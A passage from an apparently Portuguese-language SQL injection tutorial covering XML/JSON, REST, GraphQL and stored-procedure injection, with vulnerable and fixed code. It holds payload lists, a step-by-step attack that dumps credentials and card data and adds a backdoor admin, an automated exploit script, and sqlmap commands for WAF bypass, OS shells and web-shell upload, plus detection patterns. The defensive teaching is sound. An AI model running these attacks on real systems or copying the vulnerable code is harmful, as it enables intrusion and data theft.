# Aplicacao que processa XML e e vulneravel
import xml.etree.ElementTree as ET

def process_user_xml(xml_data):
    root = ET.fromstring(xml_data)
    name = root.find('name').text
    email = root.find('email').text
    
    # VULNERAVEL: dados XML incorporados a query
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        f"INSERT INTO users (name, email) VALUES ('{name}', '{email}')"
    )
    conn.commit()

# Payload: <name>admin' OR 1=1--</name>
# Query resultante: INSERT INTO users (name, email) VALUES ('admin' OR 1=1--', 'test@test.com')
```

### JSON Injection para SQLi

```python
# Aplicacao que processa JSON e e vulneravel
import json

def process_search_json(json_data):
    data = json.loads(json_data)
    search = data.get('search', '')
    category = data.get('category', '')
    
    # VULNERAVEL
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        f"SELECT * FROM products WHERE name LIKE '%{search}%' AND category = '{category}'"
    )
    return cursor.fetchall()

# Payload: {"search": "test' OR 1=1--", "category": "electronics"}
```

### XXE (XML External Entity) que Conduz a SQLi

```xml
<!-- XXE que revela estrutura do banco de dados -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
```

```python
# Aplicacao XXE que pode conduzir a SQLi
import xml.etree.ElementTree as ET

def process_xml_unsafe(xml_data):
    # VULNERAVEL: parsing de XXE habilitado
    root = ET.fromstring(xml_data)  # Em algumas versoes, XXE e habilitado por padrao
    
    name = root.find('name').text
    # O atacante pode manipular o nome via XXE
    # e causar SQLi na query
    
    conn = get_db()
    conn.execute(f"SELECT * FROM users WHERE name = '{name}'")
```

### Payloads de Injecao via XML/JSON

```sql
-- SQLi via campo XML
<username>admin'--</username>

-- SQLi via atributo XML
<user name="admin' OR 1=1--" />

-- SQLi via JSON
{"username": "admin' OR 1=1--", "password": "anything"}

-- SQLi via array JSON
{"ids": ["1' OR 1=1--", "2' OR 1=1--"]}

-- SQLi via JSON aninhado
{"filter": {"name": "test' UNION SELECT 1,2,3--"}}
```

### Prevencao

```python
# 1. Desabilitar XXE
import xml.etree.ElementTree as ET
# Em Python 3.7.1+, XXE e desabilitado por padrao em ET.fromstring()

# 2. Validar XML/JSON antes de usar
def validate_xml_input(xml_data):
    root = ET.fromstring(xml_data)
    for element in root.iter():
        if element.text and ("'" in element.text or '"' in element.text or ';' in element.text):
            raise ValueError("Invalid characters in XML input")
    
# 3. Usar parameterized queries
def process_user_safe(xml_data):
    root = ET.fromstring(xml_data)
    name = root.find('name').text
    email = root.find('email').text
    
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (name, email) VALUES (?, ?)",
        (name, email)
    )
    conn.commit()
```

---

## 5.8 SQL Injection em APIs REST

### Vetores de Ataque em APIs REST

APIs REST apresentam novos vetores de SQLi que nao existem em aplicacoes web tradicionais:

**Parametros de path:**

```http
GET /api/users/1' OR 1=1-- HTTP/1.1
GET /api/users/admin'--/profile HTTP/1.1
```

**Parametros de query:**

```http
GET /api/products?search=test' OR 1=1--&sort=name HTTP/1.1
GET /api/users?filter=status' OR 1=1-- HTTP/1.1
```

**Corpo JSON:**

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin' OR 1=1--",
  "password": "anything"
}
```

**Headers customizados:**

```http
GET /api/data HTTP/1.1
X-API-Key: 123' OR 1=1--
X-Request-ID: test' UNION SELECT 1,2,3--
```

### SQLi em GraphQL via REST

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "query { users(name: \"admin' OR 1=1--\") { id name email } }"
}
```

### SQLi em API Parameters

```python
# Flask REST API vulneravel
@app.route('/api/users/<user_id>')
def get_user(user_id):
    # VULNERAVEL: user_id do path
    conn = get_db()
    user = conn.execute(
        f"SELECT * FROM users WHERE id = '{user_id}'"
    ).fetchone()
    return jsonify(dict(user))

@app.route('/api/search')
def search():
    query = request.args.get('q', '')
    sort = request.args.get('sort', 'name')
    order = request.args.get('order', 'ASC')
    
    # VULNERAVEL: todos os parametros
    conn = get_db()
    results = conn.execute(
        f"SELECT * FROM products WHERE name LIKE '%{query}%' ORDER BY {sort} {order}"
    ).fetchall()
    return jsonify([dict(r) for r in results])

@app.route('/api/users', methods=['POST'])
def create_user():
    data = request.get_json()
    name = data.get('name', '')
    email = data.get('email', '')
    
    # VULNERAVEL: dados do JSON
    conn = get_db()
    conn.execute(
        f"INSERT INTO users (name, email) VALUES ('{name}', '{{email}}')"
    )
    conn.commit()
    return jsonify({"success": True})
```

### Prevencao em APIs REST

```python
# SEGURO: parameterized queries em todas as rotas
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    # user_id e automaticamente validado como int pelo Flask
    conn = get_db()
    user = conn.execute(
        "SELECT * FROM users WHERE id = ?",
        (user_id,)
    ).fetchone()
    return jsonify(dict(user))

@app.route('/api/search')
def search():
    query = request.args.get('q', '')
    sort = request.args.get('sort', 'name')
    order = request.args.get('order', 'ASC')
    
    # Validar sort e order
    ALLOWED_SORT = {'name', 'price', 'created_at'}
    ALLOWED_ORDER = {'ASC', 'DESC'}
    
    if sort not in ALLOWED_SORT:
        sort = 'name'
    if order not in ALLOWED_ORDER:
        order = 'ASC'
    
    # Parameterized query
    conn = get_db()
    results = conn.execute(
        f"SELECT * FROM products WHERE name LIKE ? ORDER BY {sort} {order}",
        (f"%{query}%",)
    ).fetchall()
    return jsonify([dict(r) for r in results])

@app.route('/api/users', methods=['POST'])
def create_user():
    data = request.get_json()
    name = data.get('name', '')
    email = data.get('email', '')
    
    # Validar entradas
    if not name or len(name) > 100:
        return jsonify({"error": "Invalid name"}), 400
    if not email or len(email) > 255:
        return jsonify({"error": "Invalid email"}), 400
    
    # Parameterized query
    conn = get_db()
    conn.execute(
        "INSERT INTO users (name, email) VALUES (?, ?)",
        (name, email)
    )
    conn.commit()
    return jsonify({"success": True})
```

### API Security Headers

```python
# Middleware para APIs REST
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

---

## 5.9 SQL Injection em GraphQL

### Vetores de Ataque em GraphQL

GraphQL apresenta superficies de ataque unicas:

**Em argumentos de campos:**

```graphql
query {
  user(name: "admin' OR 1=1--") {
    id
    name
    email
  }
}
```

**Em argumentos de mutation:**

```graphql
mutation {
  createUser(input: {name: "hacker'--", email: "h@evil.com"}) {
    id
  }
}
```

**Em filtros:**

```graphql
query {
  products(filter: {name: "test' UNION SELECT 1,2,3--"}) {
    id
    name
    price
  }
}
```

**Em paginacao:**

```graphql
query {
  users(page: "1' OR 1=1--") {
    edges {
      node {
        id
        name
      }
    }
  }
}
```

### SQLi em GraphQL Resolvers

```python
# GraphQL resolver vulneravel
import graphene

class UserType(graphene.ObjectType):
    id = graphene.Int()
    name = graphene.String()
    email = graphene.String()

class Query(graphene.ObjectType):
    user = graphene.Field(UserType, name=graphene.String())
    users = graphene.List(UserType, filter=graphene.String())
    
    def resolve_user(self, info, name):
        # VULNERAVEL
        db = get_db()
        result = db.execute(
            f"SELECT * FROM users WHERE name = '{name}'"
        ).fetchone()
        return UserType(id=result['id'], name=result['name'], email=result['email'])
    
    def resolve_users(self, info, filter=None):
        # VULNERAVEL
        db = get_db()
        if filter:
            result = db.execute(
                f"SELECT * FROM users WHERE {filter}"
            ).fetchall()
        else:
            result = db.execute("SELECT * FROM users").fetchall()
        return [UserType(id=r['id'], name=r['name'], email=r['email']) for r in result]
```

### Prevencao em GraphQL

```python
# GraphQL resolver SEGURO
class Query(graphene.ObjectType):
    user = graphene.Field(UserType, name=graphene.String(required=True))
    users = graphene.List(
        UserType,
        search=graphene.String(),
        sort_by=graphene.String(default_value='name'),
        page=graphene.Int(default_value=1)
    )
    
    def resolve_user(self, info, name):
        # SEGURO: parameterized query
        db = get_db()
        result = db.execute(
            "SELECT * FROM users WHERE name = ?",
            (name,)
        ).fetchone()
        if not result:
            return None
        return UserType(id=result['id'], name=result['name'], email=result['email'])
    
    def resolve_users(self, info, search=None, sort_by='name', page=1):
        # Validar sort_by
        ALLOWED_SORT = {'name', 'email', 'created_at'}
        if sort_by not in ALLOWED_SORT:
            sort_by = 'name'
        
        # Validar page
        page = max(1, min(1000, page))
        offset = (page - 1) * 20
        
        # SEGURO
        db = get_db()
        if search:
            result = db.execute(
                f"SELECT * FROM users WHERE name LIKE ? ORDER BY {sort_by} LIMIT 20 OFFSET ?",
                (f"%{search}%", offset)
            ).fetchall()
        else:
            result = db.execute(
                f"SELECT * FROM users ORDER BY {sort_by} LIMIT 20 OFFSET ?",
                (offset,)
            ).fetchall()
        
        return [UserType(id=r['id'], name=r['name'], email=r['email']) for r in result]
```

### GraphQL Security Best Practices

```python
# 1. Limitar profundidade da query
from graphql import parse
import re

MAX_DEPTH = 5

def validate_query_depth(query_string):
    document = parse(query_string)
    # Verificar profundidade maxima
    depth = calculate_depth(document)
    if depth > MAX_DEPTH:
        raise ValueError(f"Query too deep: {depth} (max: {MAX_DEPTH})")

# 2. LimitarComplexidade
MAX_COMPLEXITY = 100

def calculate_complexity(query_string):
    document = parse(query_string)
    # Calcular complexidade baseada em campos e argumentos
    complexity = 0
    for field in document.fields:
        complexity += 1
        if field.arguments:
            complexity += len(field.arguments)
    return complexity

# 3. Rate limiting
from functools import wraps
import time

def rate_limit(max_requests=100, window=60):
    def decorator(func):
        requests = []
        @wraps(func)
        def wrapper(*args, **kwargs):
            now = time.time()
            requests[:] = [r for r in requests if now - r < window]
            if len(requests) >= max_requests:
                raise ValueError("Rate limit exceeded")
            requests.append(now)
            return func(*args, **kwargs)
        return wrapper
    return decorator

# 4. Logging de queries
import logging

logger = logging.getLogger('graphql')

def log_query(query_string, user_id=None):
    logger.info(f"GraphQL Query: {query_string[:200]} | User: {user_id}")
```

---

## 5.10 Exemplo: Ataque Completo Step-by-Step

### Cenario

Aplicacao web de e-commerce com as seguintes caracteristicas:
- Backend: Python Flask
- Banco de dados: MySQL
- Funcionalidade: Listagem de produtos com busca e filtragem
- Endpoint: GET /products?search=laptop&category=electronics

### Passo 1: Reconhecimento

```bash
# Identificar a aplicacao
curl -I http://target.com/products
# Resposta revela: Server: Apache/2.4.41, X-Powered-By: Flask

# Testar endpoint basico
curl "http://target.com/products?search=test"
# Retorna: JSON com lista de produtos

# Verificar se ha erros
curl "http://target.com/products?search='"
# Retorna: Erro 500 com mensagem: "You have an error in your SQL syntax..."
```

### Passo 2: Confirmar Vulnerabilidade

```sql
# Testar condicao verdadeira
curl "http://target.com/products?search=test' AND 1=1--"
# Retorna: Lista de produtos (resultado normal)

# Testar condicao falsa
curl "http://target.com/products?search=test' AND 1=2--"
# Retorna: Lista vazia (resultado diferente)
```

### Passo 3: Determinar Numero de Colunas

```sql
# Usar ORDER BY
curl "http://target.com/products?search=test' ORDER BY 1--"
# Funciona

curl "http://target.com/products?search=test' ORDER BY 2--"
# Funciona

curl "http://target.com/products?search=test' ORDER BY 3--"
# Funciona

curl "http://target.com/products?search=test' ORDER BY 4--"
# Erro: unknown column '4'
# -> 3 colunas
```

### Passo 4: Confirmar com UNION SELECT

```sql
# Testar UNION com numero correto de colunas
curl "http://target.com/products?search=test' UNION SELECT 1,2,3--"
# Retorna: Produto com nome "2" e preco "3"
# -> Coluna 2 e exibida no nome, coluna 3 no preco
```

### Passo 5: Extrair Versao do Banco

```sql
# Versao do MySQL
curl "http://target.com/products?search=test' UNION SELECT 1,version(),3--"
# Retorna: "MySQL 5.7.34"
```

### Passo 6: Extrair Database Atual

```sql
# Nome do banco de dados
curl "http://target.com/products?search=test' UNION SELECT 1,database(),3--"
# Retorna: "ecommerce_prod"
```

### Passo 7: Listar Tabelas

```sql
# Listar tabelas do banco
curl "http://target.com/products?search=test' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='ecommerce_prod'--"
# Retorna: "products,users,orders,admin_settings,payment_info"
```

### Passo 8: Listar Colunas da Tabela Users

```sql
# Colunas da tabela users
curl "http://target.com/products?search=test' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
# Retorna: "id,username,email,password_hash,role,created_at"
```

### Passo 9: Extrair Credenciais

```sql
# Extrair usernames e passwords
curl "http://target.com/products?search=test' UNION SELECT 1,group_concat(concat(username,':',password_hash)),3 FROM users--"
# Retorna hashes de senha de todos os usuarios

# Extrair especificamente o admin
curl "http://target.com/products?search=test' UNION SELECT 1,concat(username,':',password_hash),3 FROM users WHERE role='admin'--"
# Retorna: "admin:$2y$10$hash_aqui"
```

### Passo 10: Crack da Senha

```bash
# Usar hashcat para crackear a senha
hashcat -m 3200 hash.txt wordlist.txt
# Resultado: admin:admin123
```

### Passo 11: Extrair Dados Sensiveis

```sql
# Extrair informacoes de pagamento
curl "http://target.com/products?search=test' UNION SELECT 1,group_concat(concat(card_number,':',cvv,':',expiry)),3 FROM payment_info--"
# Retorna: Dados de cartao de credito

# Extrair configuracoes do admin
curl "http://target.com/products?search=test' UNION SELECT 1,group_concat(concat(setting_key,':',setting_value)),3 FROM admin_settings--"
# Retorna: Configuracoes sensiveis
```

### Passo 12: Backdoor (apenas para demonstracao em ambiente de teste)

```sql
# Criar usuario backdoor (EM AMBIENTE DE TESTE AUTORIZADO)
curl "http://target.com/products?search=test'; INSERT INTO users (username, password_hash, role) VALUES ('backdoor', '$2y$10$hash_aqui', 'admin')--"
# Cria usuario administrador backdoor
```

### Script de Automacao

```python
import requests
import sys
import re
import time

class SQLiExploiter:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
    
    def test_injection(self, search_term):
        """Testar se a aplicacao e vulneravel a SQLi."""
        # Teste basico
        resp_normal = self.session.get(self.url, params={"search": search_term})
        resp_true = self.session.get(self.url, params={"search": f"{search_term}' AND 1=1--"})
        resp_false = self.session.get(self.url, params={"search": f"{search_term}' AND 1=2--"})
        
        if resp_normal.text == resp_true.text and resp_normal.text != resp_false.text:
            print("[+] Application is vulnerable to SQL injection")
            return True
        else:
            print("[-] Application does not appear vulnerable")
            return False
    
    def get_column_count(self, search_term):
        """Determinar numero de colunas."""
        for i in range(1, 20):
            resp = self.session.get(
                self.url,
                params={"search": f"{search_term}' ORDER BY {i}--"}
            )
            if "error" in resp.text.lower():
                print(f"[+] Column count: {i - 1}")
                return i - 1
        return None
    
    def extract_data(self, search_term, query, col_count=3):
        """Extrair dados usando UNION-based injection."""
        # Montar UNION SELECT
        nulls = ",".join(["NULL"] * col_count)
        payload = f"{search_term}' UNION SELECT {nulls.replace('NULL', query, 1)}--"
        
        resp = self.session.get(self.url, params={"search": payload})
        return resp.text
    
    def extract_version(self, search_term, col_count=3):
        """Extrair versao do banco de dados."""
        print("[*] Extracting database version...")
        return self.extract_data(search_term, "version()", col_count)
    
    def extract_database(self, search_term, col_count=3):
        """Extrair nome do banco de dados."""
        print("[*] Extracting database name...")
        return self.extract_data(search_term, "database()", col_count)
    
    def extract_tables(self, search_term, database, col_count=3):
        """Extrair nomes das tabelas."""
        print("[*] Extracting table names...")
        query = f"group_concat(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        return self.extract_data(search_term, query, col_count)
    
    def extract_columns(self, search_term, table, col_count=3):
        """Extrair colunas de uma tabela."""
        print(f"[*] Extracting columns for table: {table}")
        query = f"group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}'"
        return self.extract_data(search_term, query, col_count)
    
    def extract_data_from_table(self, search_term, columns, table, col_count=3):
        """Extrair dados de uma tabela."""
        print(f"[*] Extracting data from table: {table}")
        query = f"group_concat(concat({columns[0]},':',{columns[1]})) FROM {table}"
        return self.extract_data(search_term, query, col_count)

# Uso
if __name__ == "__main__":
    url = "http://target.com/products"
    exploiter = SQLiExploiter(url)
    
    if exploiter.test_injection("test"):
        col_count = exploiter.get_column_count("test")
        if col_count:
            version = exploiter.extract_version("test", col_count)
            print(f"Version: {version}")
            
            database = exploiter.extract_database("test", col_count)
            print(f"Database: {database}")
            
            tables = exploiter.extract_tables("test", database, col_count)
            print(f"Tables: {tables}")
```

---

## 5.11 Ferramentas: SQLMap

### Visao Geral

SQLMap e a ferramenta open-source mais popular para automatizacao de SQL injection. Detecta e explora automaticamente vetores de SQLi em aplicacoes web.

### Instalacao

```bash
# Clone do repositorio
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Ou via pip
pip install sqlmap

# Verificar versao
python sqlmap.py --version
```

### Uso Basico

```bash
# Testar URL basica
python sqlmap.py -u "http://target.com/products?id=1"

# Testar com cookie
python sqlmap.py -u "http://target.com/products?id=1" --cookie="session=abc123"

# Testar com POST data
python sqlmap.py -u "http://target.com/login" --data="username=admin&password=test"

# Testar com header customizado
python sqlmap.py -u "http://target.com/products?id=1" --headers="X-Custom: test"
```

### Extracao de Dados

```bash
# Listar bancos de dados
python sqlmap.py -u "http://target.com/products?id=1" --dbs

# Listar tabelas de um banco
python sqlmap.py -u "http://target.com/products?id=1" -D ecommerce --tables

# Listar colunas de uma tabela
python sqlmap.py -u "http://target.com/products?id=1" -D ecommerce -T users --columns

# Extrair dados de uma tabela
python sqlmap.py -u "http://target.com/products?id=1" -D ecommerce -T users --dump

# Extrair dados sensiveis
python sqlmap.py -u "http://target.com/products?id=1" -D ecommerce -T users --dump --dump-all

# Extrair schema do banco
python sqlmap.py -u "http://target.com/products?id=1" --schema
```

### Tipos de Injecao

```bash
# Forcar tipo de injecao
python sqlmap.py -u "http://target.com/products?id=1" --technique=U  # UNION
python sqlmap.py -u "http://target.com/products?id=1" --technique=E  # ERROR
python sqlmap.py -u "http://target.com/products?id=1" --technique=B  # BOOLEAN
python sqlmap.py -u "http://target.com/products?id=1" --technique=T  # TIME
python sqlmap.py -u "http://target.com/products?id=1" --technique=S  # STACKED

# Combinar tecnicas
python sqlmap.py -u "http://target.com/products?id=1" --technique=UEBTS
```

### Bypass de Protecoes

```bash
# Bypass de WAF
python sqlmap.py -u "http://target.com/products?id=1" --tamper=space2comment
python sqlmap.py -u "http://target.com/products?id=1" --tamper=charencode
python sqlmap.py -u "http://target.com/products?id=1" --tamper=randomcase

# Combinar multiplos tamper
python sqlmap.py -u "http://target.com/products?id=1" --tamper=space2comment,charencode,randomcase

# User-Agent aleatorio
python sqlmap.py -u "http://target.com/products?id=1" --random-agent

# Proxy
python sqlmap.py -u "http://target.com/products?id=1" --proxy="http://127.0.0.1:8080"

# TOR
python sqlmap.py -u "http://target.com/products?id=1" --tor --tor-type=SOCKS5
```

### Opcoes Avancadas

```bash
# Nivel de risco e teste
python sqlmap.py -u "http://target.com/products?id=1" --level=5 --risk=3

# Scripts de bypass
python sqlmap.py -u "http://target.com/products?id=1" --tamper=between,randomcase,space2comment

# Shell de comando (EM AMBIENTE DE TESTE)
python sqlmap.py -u "http://target.com/products?id=1" --os-shell

# Leitura de arquivos
python sqlmap.py -u "http://target.com/products?id=1" --file-read="/etc/passwd"

# Escrita de arquivos
python sqlmap.py -u "http://target.com/products?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### SQLMap com APIs

```bash
# API REST com JSON
python sqlmap.py -u "http://target.com/api/users?id=1" --data='{"id": 1}' --headers="Content-Type: application/json"

# GraphQL
python sqlmap.py -u "http://target.com/graphql" --data='{"query":"query{users{id name}}"}' --headers="Content-Type: application/json"
```

### Output e Relatorios

```bash
# Salvar output completo
python sqlmap.py -u "http://target.com/products?id=1" -o output.log

# Modo verboso
python sqlmap.py -u "http://target.com/products?id=1" -v 3

# Modo quiet (apenas resultados)
python sqlmap.py -u "http://target.com/products?id=1" --batch --quiet
```

---

## 5.12 Ferramentas: Havij

### Visao Geral

Havij e uma ferramenta automatizada de SQL injection desenvolvida pela Iranian Cyber Art Team. E uma ferramenta grafica (GUI) que facilita a exploracao de SQLi para usuarios menos experientes.

### Caracteristicas Principais

**Detecao automatica de tipo de injecao:**
- UNION-based
- Error-based
- Boolean-based blind
- Time-based blind
- Stacked queries

**Extracao de dados:**
- Listagem de bancos de dados
- Listagem de tabelas
- Listagem de colunas
- Dump de dados

**Recursos avancados:**
- Bypass de WAF e IPS
- Suporte a multiplos SGBDs (MySQL, MSSQL, Oracle, PostgreSQL)
- Proxy e SOCKS support
- Exportacao de dados para XML, CSV, HTML

### Interface Grafica

Havij oferece uma interface intuitiva com as seguintes abas principais:

**Target:** URL do alvo e metodo de injecao
**Injection:** Tipo de injecao detectada
**Data:** Dados extraidos (bancos, tabelas, colunas)
**Tables:** Listagem de tabelas
**About:** Informacoes da ferramenta

### Configuracao

```
1. Target URL: http://target.com/products?id=1
2. Method: GET ou POST
3. Injection point: Auto-detect ou Manual
4. Data format: Auto-detect
5. Tamper: Nenhum,.space2comment, etc.
```

### Limitacoes

- So funciona em Windows (via Wine em Linux)
- Ferramenta proprietaria (nao open-source)
- Pode ser detectada por antivirus como malware
- Menos flexivel que SQLMap para customizacao

---

## 5.13 Defesas Avancadas

### Defense-in-Depth Completa

```python
# Arquitetura de defesa em camadas

# Camada 1: Input Validation Layer
class InputValidator:
    PATTERNS = {
        'username': r'^[a-zA-Z0-9_]{3,50}$',
        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        'id': r'^[0-9]+$',
        'search': r'^[a-zA-Z0-9\s]{1,100}$',
    }
    
    SQLI_PATTERNS = [
        r"(?i:union\s+select)",
        r"(?i:or\s+\d+\s*=\s*\d+)",
        r"(?i:--\s)",
        r"(?i:/\*.*\*/)",
        r"(?i:;\s*(?:drop|delete|insert|update|exec)\s)",
    ]
    
    @classmethod
    def validate(cls, field_type, value):
        if field_type in cls.PATTERNS:
            if not re.match(cls.PATTERNS[field_type], value):
                raise ValueError(f"Invalid {field_type} format")
        
        # Verificar SQLi
        for pattern in cls.SQLI_PATTERNS:
            if re.search(pattern, str(value)):
                raise ValueError("Potentially malicious input detected")
        
        return value

# Camada 2: Query Builder Layer
class SecureQueryBuilder:
    def __init__(self, db):
        self.db = db
    
    def select(self, table, columns, conditions=None, params=None):
        ALLOWED_TABLES = {'users', 'products', 'orders'}
        ALLOWED_COLUMNS = {
            'users': {'id', 'username', 'email', 'created_at'},
            'products': {'id', 'name', 'description', 'price', 'category'},
            'orders': {'id', 'user_id', 'total', 'status', 'created_at'},
        }
        
        if table not in ALLOWED_TABLES:
            raise ValueError(f"Invalid table: {table}")
        
        for col in columns:
            if col not in ALLOWED_COLUMNS[table]:
                raise ValueError(f"Invalid column: {col}")
        
        query = f"SELECT {', '.join(columns)} FROM {table}"
        query_params = []
        
        if conditions:
            for key, value in conditions.items():
                if key not in ALLOWED_COLUMNS[table]:
                    raise ValueError(f"Invalid condition column: {key}")
                query += f" WHERE {key} = ?"
                query_params.append(value)
        
        return self.db.execute(query, query_params)
    
    def insert(self, table, data):
        ALLOWED_TABLES = {'users', 'products', 'orders'}
        
        if table not in ALLOWED_TABLES:
            raise ValueError(f"Invalid table: {table}")
        
        columns = ', '.join(data.keys())
        placeholders = ', '.join(['?' for _ in data])
        values = list(data.values())
        
        query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
        return self.db.execute(query, values)

# Camada 3: Query Monitor Layer
class QueryMonitor:
    def __init__(self):
        self.suspicious_patterns = []
    
    def log_query(self, query, user_id=None):
        # Detectar padroes suspeitos
        suspicious = [
            r"(?i:information_schema)",
            r"(?i:sys\.tables)",
            r"(?i:pg_tables)",
            r"(?i:union\s+select)",
            r"(?i:;\s*(?:drop|delete|insert|update)\s)",
            r"(?i:exec\s*\()",
            r"(?i:xp_cmdshell)",
        ]
        
        for pattern in suspicious:
            if re.search(pattern, query):
                self.suspicious_patterns.append({
                    'query': query[:200],
                    'user_id': user_id,
                    'timestamp': time.time(),
                    'pattern': pattern
                })
                # Alertar
                self.send_alert(query, user_id)
    
    def send_alert(self, query, user_id):
        # Enviar alerta para equipe de seguranca
        print(f"[ALERT] Suspicious query from user {user_id}: {query[:100]}")

# Camada 4: Rate Limiting Layer
class RateLimiter:
    def __init__(self, max_requests=100, window=60):
        self.max_requests = max_requests
        self.window = window
        self.requests = {}
    
    def check_rate(self, user_id):
        now = time.time()
        if user_id not in self.requests:
            self.requests[user_id] = []
        
        # Limpar requisicoes antigas
        self.requests[user_id] = [
            r for r in self.requests[user_id] if now - r < self.window
        ]
        
        if len(self.requests[user_id]) >= self.max_requests:
            raise ValueError("Rate limit exceeded")
        
        self.requests[user_id].append(now)
```

### Auditoria e Logging

```python
# Sistema de auditoria para SQLi
import logging
import json
from datetime import datetime

class SQLiAuditor:
    def __init__(self, log_file='sqli_audit.log'):
        self.logger = logging.getLogger('sqli_auditor')
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def log_injection_attempt(self, request, payload, result):
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'ip': request.remote_addr,
            'method': request.method,
            'url': request.url,
            'headers': dict(request.headers),
            'payload': payload,
            'result': result,
            'user_agent': request.user_agent.string,
        }
        self.logger.warning(f"SQLi attempt: {json.dumps(log_entry)}")
    
    def log_suspicious_query(self, query, user_id, execution_time):
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'query': query[:500],
            'user_id': user_id,
            'execution_time': execution_time,
        }
        self.logger.info(f"Suspicious query: {json.dumps(log_entry)}")
    
    def generate_report(self, start_date, end_date):
        # Gerar relatorio de tentativas de SQLi
        pass
```

### Testing de Seguranca

```python
# Testes automatizados para SQLi
import unittest
import requests

class TestSQLiVulnerabilities(unittest.TestCase):
    BASE_URL = "http://localhost:5000"
    
    def test_login_sqli(self):
        """Testar SQLi no formulario de login."""
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "') OR ('1'='1",
        ]
        
        for payload in payloads:
            response = requests.post(f"{self.BASE_URL}/login", json={
                "username": payload,
                "password": "anything"
            })
            
            # Verificar se o login foi bem-sucedido (vulneravel)
            self.assertNotEqual(response.status_code, 200,
                f"SQLi vulnerable with payload: {payload}")
    
    def test_search_sqli(self):
        """Testar SQLi no campo de busca."""
        payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
        ]
        
        for payload in payloads:
            response = requests.get(f"{self.BASE_URL}/products/search",
                params={"q": payload})
            
            # Verificar se retornou dados que nao deveria
            self.assertNotIn("admin", response.text,
                f"SQLi vulnerable with payload: {payload}")
    
    def test_api_sqli(self):
        """Testar SQLi em API REST."""
        payloads = [
            {"search": "' OR 1=1--"},
            {"filter": "name' OR 1=1--"},
            {"sort": "name' OR 1=1--"},
        ]
        
        for payload in payloads:
            response = requests.post(f"{self.BASE_URL}/api/search",
                json=payload)
            
            # Verificar se retornou dados extras
            self.assertNotEqual(response.status_code, 200,
                f"SQLi vulnerable with payload: {payload}")

if __name__ == "__main__":
    unittest.main()
```

### Resumo de Defesas Avancadas

| Camada | Mecanismo | Efetividade |
|--------|-----------|-------------|
| Input Validation | Whitelist, regex, sanitizacao | 70% |
| Parameterized Queries | Bind variables, prepared statements | 95% |
| ORM Security | Uso correto, evitar raw queries | 80% |
| WAF Rules | ModSecurity, AWS WAF, Cloudflare | 60% |
| Rate Limiting | Requisicoes por IP/usuario | 40% |
| Query Monitoring | Logging, alertas, anomalias | 50% |
| Database Permissions | Least privilege, user isolation | 70% |
| Network Segmentation | VLANs, firewalls internos | 60% |
| Code Review | Auditoria manual e automatizada | 85% |
| Security Testing | DAST, SAST, pentest | 90% |

A combinacao de todas essas camadas cria uma defesa robusta contra SQL injection. Nenhuma camada individual e suficiente, mas juntas oferecem protecao significativa.

---

## 5.14 SQL Injection em Stored Procedures

### Riscos em Stored Procedures

Stored procedures podem conter SQL injection se constroem queries dinamicas com input do usuario:

```sql
-- SQL Server: stored procedure vulneravel
CREATE PROCEDURE SearchEmployees
    @search NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM employees WHERE name LIKE ''%' + @search + '%'''
    EXEC(@sql)
END

-- Payload para explorar
EXEC SearchEmployees @search = "test' OR 1=1--"
-- Query resultante: SELECT * FROM employees WHERE name LIKE '%test' OR 1=1--%'
```

**Stored procedure segura com parameterized query:**

```sql
-- SQL Server: stored procedure segura
CREATE PROCEDURE SearchEmployeesSafe
    @search NVARCHAR(100)
AS
BEGIN
    SELECT * FROM employees WHERE name LIKE '%' + @search + '%'
    -- SQL Server trata @search como dado, nao como estrutura
END
```

**MySQL stored procedure vulneravel:**

```sql
-- MySQL: stored procedure vulneravel
DELIMITER //
CREATE PROCEDURE SearchProducts(IN searchTerm VARCHAR(100))
BEGIN
    SET @sql = CONCAT('SELECT * FROM products WHERE name LIKE "%', searchTerm, '%"');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END //

-- Payload
CALL SearchProducts('test" OR 1=1--');
```

**MySQL stored procedure segura:**

```sql
-- MySQL: stored procedure segura
DELIMITER //
CREATE PROCEDURE SearchProductsSafe(IN searchTerm VARCHAR(100))
BEGIN
    SET @sql = 'SELECT * FROM products WHERE name LIKE CONCAT("%", ?, "%")';
    PREPARE stmt FROM @sql;
    SET @search = searchTerm;
    EXECUTE stmt USING @search;
    DEALLOCATE PREPARE stmt;
END //
```

### Prevencao em Stored Procedures

```sql
-- Principio: nunca concatenar input do usuario em queries dinamicas

-- ERRADO
